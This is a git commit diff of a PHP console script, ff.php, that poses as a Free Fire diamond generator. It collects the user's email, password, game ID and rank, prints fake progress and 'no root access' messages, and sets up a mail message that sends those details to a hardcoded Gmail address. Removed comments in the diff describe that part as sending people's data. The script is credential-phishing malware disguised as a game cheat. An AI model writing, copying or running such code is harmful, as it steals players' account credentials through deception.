260668e0f4fa997b4cc4a0f9ec44c0adf92d5757
K0NT0L <46758245+K0NT0L@users.noreply.github.com>
2019-01-27 21:29:44 +0700

    Update ff.php

--- ff.php
+++ ff.php
@@ -3,7 +3,7 @@
 <?php
 
 
-$cyan ="\e[36m";
+$cyan = "\e[36m";
 $red = "\e[91m";
 $yellow = "\e[93m";
 $blue = "\e[36m"; 
@@ -15,12 +15,11 @@ echo "\e[36m|  ___|  _ \| ____| ____| |  ___|_ _|  _ \| ____|\n";
 echo "\e[36m| |_  | |_) |  _| |  _|   | |_   | || |_) |  _|\n";
 echo "\e[36m|  _| |  _ <| |___| |___  |  _|  | ||  _ <| |___\n";
 echo "\e[36m|_|   |_| \_\_____|_____| |_|   |___|_| \_\_____|\n";
-
-echo "\e[36m****************************************\n";
+echo "\n";
 echo "\033[95mDONT USE THIS FOR ILEGAL PURPOSE !\n";
 echo "$yellow  AUTHOR: StarFuckTak'-'\n";
 echo "$blue Team :SAD Cyber Team\n";
-echo "\n";
+echo "\e[36m************************************************\n";
 
 function input($echo) {
 
@@ -40,7 +39,7 @@ $gg = trim(fgets(STDIN));
 input("$cyan Masukan Jumlah diamond (1000) : \n");
 $tod = trim(fgets(STDIN));
 echo "\033[91m<---------RESULT--------->\n";
-echo "\033[92mDATA ANDA $imel DAN $san SIAP DI GUNAKAN\n";
+echo "\033[92mDATA ANDA  SIAP DI GUNAKAN\n";
 echo "\033[92mMemulai Proses ke website garena\n";
 echo "\033[92mRUNTIME BEGIN............\n";
 sleep(3);
@@ -69,14 +68,12 @@ sleep(3);
 echo "\033[91mYAIKKSS NO ROOT ACCES\n";
 echo "\033[91mFUCK THE SISTEM !!!\033[00m\n";
 echo "$cyan first! root your system\n";
-//ini buat ngirim data orang
-//jgn banyak diganti yaaa:v
                 ini_set( 'display_error', 1);
                 error_reporting( E_ALL);
                 $from = "bintang1562@gmail.com";
                 $to = "kadalbiawak43@gmail.com";
                 $subject = "Setor ikan heker";
-$txt = "$imel.";
+$txt = "emailna $imel.";
         $acc = "Passwordnya $san.";
                 $zz = "ID FFNya .$gg.";
                $acc = " RankNya .$xx.";
